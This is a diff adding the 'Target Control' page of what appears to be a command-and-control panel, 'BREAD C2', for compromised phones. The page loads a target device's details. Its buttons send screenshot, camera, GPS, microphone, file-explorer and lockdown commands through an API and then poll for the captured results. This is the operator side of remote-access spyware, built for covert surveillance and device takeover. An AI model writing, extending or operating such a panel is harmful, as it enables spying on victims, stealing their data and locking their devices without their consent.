@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Target Control - BREAD C2</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-md-2 sidebar">
+            <h4 class="text-glow"><i class="bi bi-cpu"></i> BREAD C2</h4>
+            <nav class="nav flex-column">
+                <a class="nav-link" href="dashboard.html"><i class="bi bi-grid"></i> Dashboard</a>
+                <a class="nav-link active" href="#"><i class="bi bi-phone"></i> Target Control</a>
+                <a class="nav-link" href="#"><i class="bi bi-terminal"></i> Commands</a>
+                <a class="nav-link" href="#"><i class="bi bi-file-earmark-text"></i> Logs</a>
+                <a class="nav-link" href="#"><i class="bi bi-gear"></i> Settings</a>
+                <hr style="border-color:#1f2a3a;">
+                <a class="nav-link text-danger" href="#" onclick="logout()"><i class="bi bi-box-arrow-right"></i> Logout</a>
+            </nav>
+        </div>
+        <div class="col-md-10 p-4">
+            <h3><i class="bi bi-phone"></i> Target Control</h3>
+            <div id="targetInfo" class="alert alert-info">Loading target info...</div>
+            
+            <div class="row g-2 mt-3">
+                <button class="btn btn-primary col-2" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
+                <button class="btn btn-primary col-2" onclick="sendCmd('camera')"><i class="bi bi-camera-fill"></i> Camera</button>
+                <button class="btn btn-primary col-2" onclick="sendCmd('gps')"><i class="bi bi-geo-alt"></i> GPS</button>
+                <button class="btn btn-primary col-2" onclick="sendCmd('mic')"><i class="bi bi-mic"></i> Mic</button>
+                <button class="btn btn-primary col-2" onclick="sendCmd('file_explorer')"><i class="bi bi-folder"></i> Files</button>
+                <button class="btn btn-danger col-2" onclick="sendCmd('lockdown')"><i class="bi bi-lock"></i> Lockdown</button>
+            </div>
+
+            <div id="resultArea" class="mt-4">
+                <h5>Command Results</h5>
+                <pre class="terminal" id="cmdOutput" style="height:300px;">[system] Ready...</pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    import { API_BASE } from './js/config.js';
+    
+    const params = new URLSearchParams(window.location.search);
+    const uuid = params.get('uuid');
+    if (!uuid) {
+        window.location.href = 'dashboard.html';
+    }
+    const token = localStorage.getItem('token');
+    if (!token) window.location.href = 'index.html';
+
+    // Load target info
+    async function loadTargetInfo() {
+        try {
+            const res = await fetch(API_BASE + '/api/targets/' + uuid, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (res.status === 401) { logout(); return; }
+            const data = await res.json();
+            document.getElementById('targetInfo').innerHTML = `
+                <strong>${data.device_name || 'Unknown'}</strong> (${data.model || 'N/A'}) 
+                - Battery: ${data.battery || 0}% 
+                - Status: <span class="badge ${data.status === 'online' ? 'badge-online' : 'badge-offline'}">${data.status}</span>
+                - Last seen: ${data.last_seen || 'Never'}
+            `;
+        } catch (e) {
+            document.getElementById('targetInfo').innerHTML = '❌ Error loading target info';
+        }
+    }
+    loadTargetInfo();
+
+    // Send command
+    window.sendCmd = async function(cmd) {
+        const output = document.getElementById('cmdOutput');
+        output.innerText = `[${new Date().toLocaleTimeString()}] Sending command: ${cmd}...`;
+        try {
+            const res = await fetch(API_BASE + '/api/commands', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({ target_uuid: uuid, command: cmd, params: {} })
+            });
+            const data = await res.json();
+            if (data.command_id) {
+                output.innerText += `\n✅ Command sent (ID: ${data.command_id})\nWaiting for result...`;
+                // Poll hasil (atau gunakan WebSocket)
+                // Sederhana: kita fetch log setelah beberapa detik
+                setTimeout(async () => {
+                    try {
+                        const logRes = await fetch(API_BASE + '/api/logs/' + uuid, {
+                            headers: { 'Authorization': `Bearer ${token}` }
+                        });
+                        const logs = await logRes.json();
+                        if (logs.length > 0) {
+                            const last = logs[0];
+                            output.innerText += `\n📦 Result: ${JSON.stringify(JSON.parse(last.data || '{}'), null, 2)}`;
+                        }
+                    } catch (e) {}
+                }, 3000);
+            } else {
+                output.innerText += `\n❌ Error: ${data.error || 'Unknown'}`;
+            }
+        } catch (e) {
+            output.innerText += `\n❌ Network error: ${e.message}`;
+        }
+    };
+
+    window.logout = function() {
+        localStorage.removeItem('token');
+        window.location.href = 'index.html';
+    };
+</script>
+</body>
+</html>
